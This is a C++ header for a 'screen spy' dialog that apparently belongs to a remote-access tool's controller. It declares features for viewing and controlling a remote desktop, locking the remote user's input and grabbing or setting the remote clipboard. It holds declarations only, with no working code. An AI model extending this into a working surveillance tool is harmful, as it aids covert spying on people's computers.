#pragma once
#include"IOCPServer.h"

// CScreenSpyDlg 对话框


enum
{
	IDM_CONTROL = 0x1010,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,	// 锁定远程计算机输入
	IDM_SAVEDIB,		// 保存图片
	IDM_GET_CLIPBOARD,	// 获取剪贴板
	IDM_SET_CLIPBOARD,	// 设置剪贴板
};
class CScreenSpyDlg : public CDialog
{
	DECLARE_DYNAMIC(CScreenSpyDlg)

public:
	CScreenSpyDlg(CWnd* pParent = NULL, IOCPServer* IOCPServer = NULL, CONTEXT_OBJECT *ContextObject = NULL);   // 标准构造函数
	virtual ~CScreenSpyDlg();
	VOID SendNext();
	VOID OnReceiveComplete();
	VOID UpdateServerClipboard(char * szBuffer, ULONG ulLength);
	VOID DrawFirstScreen();
	VOID DrawTipString(CString strString);

	VOID DrawNextScreenDiff();
	BOOL SaveSnapshot();
	VOID SendCommand(MSG* Msg);

public:
	CONTEXT_OBJECT* m_ContextObject;
	IOCPServer* m_IocpServer;
	HDC m_FullDC;
	HDC m_hFullMemDC;
	HBITMAP m_BitmapHandle;
	PVOID m_BitmapData_Full;
	LPBITMAPINFO m_BitmapInfor_Full;
	BOOL m_bIsFirst;
	ULONG m_ulHScrollPos;
	ULONG m_ulVScrollPos;
	HICON m_hIcon;
	HICON m_hCursor;
	POINT m_ClientCursorPos;
	CString m_strClientIP;
	BOOL m_bIsTraceCursor;
	BOOL m_bIsCtrl;
	LPBYTE m_szData;
	BOOL m_bSend;
	ULONG m_ulMsgCount;

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_DIALOG_SCREEN_SPY };
#endif

protected:
	VOID SendServerClipboard();
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
};


